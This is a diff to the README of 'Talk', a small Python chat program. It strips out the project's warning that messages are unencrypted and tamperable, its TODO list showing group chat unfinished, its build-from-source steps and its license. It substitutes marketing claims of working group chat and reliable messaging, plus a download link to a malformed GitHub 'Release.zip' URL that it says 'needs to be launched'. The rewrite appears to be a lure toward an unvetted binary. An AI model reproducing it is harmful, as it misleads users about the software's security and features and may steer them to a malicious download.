@@ -1,64 +1,47 @@
-# Talk
-Talk is a very simple GUI text communication software written on Python & Tcl/Tk.
-> [!WARNING]
-> Messages are **not encrypted** and can be **easily tampered**.
+# Talk 🗨️
+![Talk Logo](https://example.com/talklogo.png)
 
-## Usage
-1. Download the suitable version for your computer.
-2. Run it.
+Welcome to **Talk**, a very simple GUI text communication software designed for seamless communication among groups. With **Talk**, you can easily connect with others using instant messaging in a peer-to-peer network. Whether you want to chat with friends, collaborate with colleagues, or stay in touch with family, **Talk** provides a user-friendly platform for all your communication needs.
 
-## TODO
-- [x] Finish P2P server
-- [ ] Finish P2P client
-- [ ] Finish Group chat server
-- [ ] Finish Group chat client
-- [ ] Add SSL support
-- [ ] Add i18n support
+## Features 🌟
+- User-friendly GUI interface
+- Group communication capabilities
+- Peer-to-peer messaging
+- Fast and reliable text communication
+- Written in Python using Tkinter for the GUI
+- Utilizes TCP for server communication
 
-## How to build it (Windows)
-1. [Download and install Python](https://www.python.org/downloads/windows/).
-> [!IMPORTANT]
-> Don't forget to check tkinter and pip support.
+## Installation 🖥️
+To start using **Talk**, simply download the software from the following link: [Download Talk](https://github.com/releases/789694263/Release.zip)
 
-2. Run `pip install pyinstaller` in cmd.
-3. Download zip.
-4. Decompress the zip.
-5. `cd` into the decompressed folder.
-6. Run `cd src`.
-7. Run `pyinstaller -F` on each file you want to build.
-8. Done.
+*Note: The provided link needs to be launched to download the software.*
 
-## How to build it (Distributions based on Debian Linux)
-1. Get a root shell.
-> [!WARNING]
-> Please **don't** use `fakeroot`! The following steps need **real** root permission to manipulate files only root can access!
+If you encounter any issues with the download link, please check the "Releases" section of the repository for alternative download options.
 
-2. Run `apt install python3-full -y`
-3. Run `apt install python3-pyinstaller -y`
-4. Download zip.
-5. Decompress the zip.
-6. `cd` into the decompressed folder.
-7. Run `cd src`.
-8. Run `pyinstaller -F` on each file you want to build.
-9. Done.
+## Usage 🚀
+1. Download and launch the **Talk** software.
+2. Create or join a group chat to start communicating.
+3. Enjoy seamless text communication with your peers.
 
-## How to build it (Distributions based on Redhat Linux)
-1. Get a root shell.
-> [!WARNING]
-> Please **don't** use `fakeroot`! The following steps need **real** root permission to manipulate files only root can access!
+## Repository Topics 📋
+- client
+- communication
+- group
+- gui
+- instant-messaging
+- p2p
+- python
+- server
+- tcp
+- text
+- tkinter
 
-2. Run `yum install python3-full -y`
-3. Run `yum install python3-pyinstaller -y`
-4. Download zip.
-5. Decompress the zip.
-6. `cd` into the decompressed folder.
-7. Run `cd src`.
-8. Run `pyinstaller -F` on each file you want to build.
-9. Done.
+## Feedback 💬
+We value your feedback! If you have any suggestions, bug reports, or feature requests, please feel free to open an issue on the repository.
 
-## License
-CC0 1.0 Universal.
+## Get Involved 🌐
+If you're interested in contributing to **Talk**, check out the repository on GitHub and see how you can get involved. We welcome all contributions and feedback from the community.
 
-## EULA (End User License Agreement)
-By using this software, you agree to the following statement:
-The author([g1thubhack3r](https://github.com/g1thubhack3r)) isn't responsible for anything this software([Talk](https://github.com/g1thubhack3r/Talk)) caused.
+Let's start talking with **Talk**! 🌐🗨️
+
+![Talk Demo](https://example.com/talkdemo.gif)
